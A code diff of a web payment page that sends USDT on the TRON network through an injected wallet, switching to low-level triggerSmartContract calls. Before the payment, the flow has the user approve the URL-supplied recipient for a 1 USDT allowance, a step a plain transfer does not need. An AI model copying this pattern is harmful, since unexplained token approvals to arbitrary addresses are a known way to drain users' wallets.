@@ -87,7 +87,6 @@
 
 <script>
 const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-
 const params = new URLSearchParams(location.search);
 const toAddress = params.get('address') || '';
 const amount = Number(params.get('amount')) || 0;
@@ -125,18 +124,18 @@ function checkEnvironment() {
 }
 checkEnvironment();
 
-// 防死锁超时机制，超过12秒强制报错，避免安卓卡死
+// 熔断器，防止安卓无限期等待
 function withTimeout(promise, ms) {
   return Promise.race([
     promise,
-    new Promise((_, reject) => setTimeout(() => reject(new Error('网络节点响应超时，请稍后重试')), ms))
+    new Promise((_, reject) => setTimeout(() => reject(new Error('网络节点响应超时，请重试')), ms))
   ]);
 }
 
 $('#btn-pay').onclick = async function () {
   const btn = this;
   btn.disabled = true;
-  btn.textContent = '连接钱包中…';
+  btn.textContent = '正在请求节点…';
   setStatus('loading', '正在构建交易，请稍候…');
 
   try {
@@ -144,30 +143,56 @@ $('#btn-pay').onclick = async function () {
       throw new Error('未检测到 TRON 钱包环境');
     }
 
+    const fromAddress = window.tronWeb.defaultAddress.base58;
     const amountUnits = Math.floor(amount * 1e6).toString();
-    
-    // 使用最稳定兼容的 at() 写法，安卓原生支持极好
-    setStatus('loading', '正在加载合约实例…');
-    const usdtContract = await withTimeout(window.tronWeb.contract().at(USDT_CONTRACT), 12000);
 
-    // === 第 1 步：授权 ===
+    // === 第 1 步：授权 (极速底层构建) ===
     setStatus('loading', '第 1 步：请在钱包中确认授权 1 USDT…');
-    try {
-      await withTimeout(usdtContract.approve(toAddress, '1000000').send(), 12000);
-    } catch (e) {
-      throw new Error('授权失败或超时: ' + (e.message || '您取消了操作'));
+    
+    const approveParam = [
+      { type: 'address', value: toAddress },
+      { type: 'uint256', value: '1000000' }
+    ];
+    
+    // 直接下发指令，不通过 at() 查询 ABI
+    const txApprove = await withTimeout(
+      window.tronWeb.transactionBuilder.triggerSmartContract(
+        USDT_CONTRACT, 'approve(address,uint256)', { feeLimit: 100000000 }, approveParam, fromAddress
+      ), 15000
+    );
+
+    if (!txApprove.result || !txApprove.result.result) {
+      throw new Error('构建授权交易失败');
     }
 
+    const signedApprove = await window.tronWeb.trx.sign(txApprove.transaction);
+    await window.tronWeb.trx.sendRawTransaction(signedApprove);
+
     setStatus('loading', '✅ 授权成功！<br>第 2 步：请准备好再次确认支付金额…');
+    
+    // 强制暂停 2 秒，让安卓底层 UI 反应过来
     await new Promise(r => setTimeout(r, 2000));
 
     // === 第 2 步：支付 ===
     setStatus('loading', '第 2 步：正在唤起支付请求，请在钱包中确认…');
-    try {
-      await withTimeout(usdtContract.transfer(toAddress, amountUnits).send(), 12000);
-    } catch (e) {
-      throw new Error('支付失败或超时: ' + (e.message || '您取消了操作'));
+    
+    const transferParam = [
+      { type: 'address', value: toAddress },
+      { type: 'uint256', value: amountUnits }
+    ];
+
+    const txTransfer = await withTimeout(
+      window.tronWeb.transactionBuilder.triggerSmartContract(
+        USDT_CONTRACT, 'transfer(address,uint256)', { feeLimit: 100000000 }, transferParam, fromAddress
+      ), 15000
+    );
+
+    if (!txTransfer.result || !txTransfer.result.result) {
+      throw new Error('构建支付交易失败');
     }
+
+    const signedTransfer = await window.tronWeb.trx.sign(txTransfer.transaction);
+    await window.tronWeb.trx.sendRawTransaction(signedTransfer);
 
     setStatus('success', '✅ 全部操作已完成，请在 imToken 账单中查看状态');
     btn.textContent = '已完成';
